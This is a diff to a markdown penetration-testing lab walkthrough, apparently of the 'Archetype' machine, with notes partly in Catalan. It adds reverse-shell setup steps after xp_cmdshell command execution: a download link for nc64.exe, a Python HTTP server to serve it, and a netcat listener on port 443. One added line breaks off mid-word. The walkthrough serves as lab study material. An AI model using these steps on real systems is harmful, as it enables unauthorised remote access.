@@ -85,9 +85,20 @@ SQL> xp_cmdshell "whoami"
 # Reverse Shell
 Now, attempt to get stable reverse shell. 
 Use `nc64.exe` to execute interactive `cmd.exe` process on our listening port.
+Download [Link](https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------)
+
+> Simple HTTP server
+```bash
+$ sudo python3 -m http.server 80
+```
+
+> Netcat Listener
+```bash
+$ sudo nc -lvnp 443
+```
+[netcat]: Allows to op
 
 
-# Archetype
 
 
 !! Com que ja podem executar commandes, intentarem executar una reverse shell. (nc64.exe)
